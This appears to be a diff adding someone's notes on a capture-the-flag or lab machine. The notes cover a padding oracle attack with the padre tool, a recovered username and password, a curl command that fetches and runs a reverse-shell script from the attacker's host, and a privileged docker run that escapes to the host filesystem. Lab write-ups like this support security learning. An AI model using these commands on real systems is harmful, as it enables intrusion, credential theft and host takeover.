@@ -1,0 +1,40 @@
+In oracle
+----------
+encrypted data > decryption correct > remove padding success > authentication success
+encrypted data > decryption incorrect > invalid padding > error occured.
+
+In order to get the decrypted data, we have to use oracle padding exploit tool called padre
+
+
+sudo ./padre-linux-amd64 -u "http://10.10.149.175:8080/api/debug/$" -e "lhex" -p 60 -err "Decryption error" "39353661353931393932373334633638EA0DCC6E567F96414433DDF5DC29CDD5E418961C0504891F0DED96BA57BE8FCFF2642D7637186446142B2C95BCDEDCCB6D8D29BE4427F26D6C1B48471F810EF4"
+
+stefan1197:ebb2B76@62#f??7cA6B76@6!@62#f6dacd2599
+
+You have access to the webshell with admin user, but whatever command you write, the webpage doesn't display at all
+
+In order to know your command works > test wit curl > call back your local IP 
+-----------------------------------------------------------------------------
+
+#python3 -m http.server 9999
+
+---> curl http://10.4.73.176:9999/
+
+Finally download reverse1.sh to the webpage and gain reverse shell
+
+---> curl http://10.4.73.176/reverse1.sh -o /tmp/reverse1.sh
+---> bash /tmp/reverse1.sh
+
+
+Docker Breakout Privilege escalation
+-------------------------------------
+In order to run privilege escalation command > /run/docker.sock must have write permission
+
+rwx w .   /run/docker.sock
+
+Infiltrate the docker image with bash shell (cd6261dd9dda is image id)
+#docker images
+#docker run -it --privileged -v /:/mnt/ cd6261dd9dda chroot /mnt/ bash
+
+
+
+
